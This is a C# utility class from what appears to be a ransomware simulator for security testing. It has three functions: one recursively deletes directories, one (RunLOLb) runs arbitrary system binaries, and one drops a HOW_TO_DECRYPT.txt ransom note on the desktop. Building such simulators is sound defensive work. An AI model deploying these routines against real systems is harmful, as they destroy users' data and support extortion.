using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace RansomwareSimulator.Helper
{
    public static class Utils
    {
        public static void DeleteDirectory(string path)
        {
            if (Directory.Exists(path))
            {
                //Delete all files from the Directory
                foreach (string file in Directory.GetFiles(path))
                {
                    Console.WriteLine("Removing {0}", file);
                    File.Delete(file);
                }
                //Delete all child Directories
                foreach (string directory in Directory.GetDirectories(path))
                {
                    DeleteDirectory(directory);
                }
                //Delete a Directory
                Directory.Delete(path);
            }
        }
        public static string RunLOLb(string strCommand, string strCommandParameters, string strWorkingDirectory = "")
        {
            //Create process
            System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
            //strCommand is path and file name of command to run
            pProcess.StartInfo.FileName = strCommand;
            //strCommandParameters are parameters to pass to program
            pProcess.StartInfo.Arguments = strCommandParameters;
            pProcess.StartInfo.UseShellExecute = false;
            //Set output of program to be written to process output stream
            pProcess.StartInfo.RedirectStandardOutput = true;
            if (!string.IsNullOrEmpty(strWorkingDirectory))
            {
                pProcess.StartInfo.WorkingDirectory = strWorkingDirectory;
            }
            //Start the process
            pProcess.Start();
            //Get program output
            string strOutput = pProcess.StandardOutput.ReadToEnd();
            //Wait for process to finish
            pProcess.WaitForExit();
            return strOutput;
        }
        public static void DropRansomNote()
        {
            try
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\HOW_TO_DECRYPT.txt", Consts.RansomNote);
            }
            catch (Exception ex)
            {

                Console.WriteLine($"Error while dropping the ransom note. {ex.Message}");
            }
      
        }
    }
}
